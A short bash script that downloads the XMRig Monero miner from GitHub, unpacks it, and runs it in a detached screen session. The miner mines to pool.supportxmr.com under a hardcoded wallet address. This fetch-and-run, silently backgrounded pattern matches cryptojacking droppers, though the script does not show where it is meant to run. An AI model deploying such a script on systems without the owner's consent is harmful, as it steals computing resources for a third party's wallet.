#!/bin/bash
echo "Starting tasks..."

# Step 1: Download xmrig
wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz

# Check if download was successful
if [ $? -eq 0 ]; then
  echo "Download successful."
else
  echo "Download failed. Exiting."
  exit 1
fi

# Step 2: Extract the tar file
tar -xzf xmrig-6.24.0-linux-static-x64.tar.gz
cd xmrig-6.24.0

# Step 3: Start screen session and run xmrig
echo "Starting xmrig in a screen session..."
screen -S xmrig -dm bash -c './xmrig -o pool.supportxmr.com:443 -u 4AmfX4uUZyVVcGzhgin8NMhpGYc4ADuruUPueNv1KUkm5zs4ysCTSb6fDh3M6vvRsyQtBUNweWiLQdW5RYQrWiHTAMYdbiz -k --tls'

# Optional: Wait to ensure xmrig starts
sleep 2

# Step 4: Detach from the screen session (Ctrl+A, D equivalent)
screen -S xmrig -X detach

# Step 5: Exit the script (Ctrl+D equivalent)
echo "Tasks complete. Exiting script..."
exit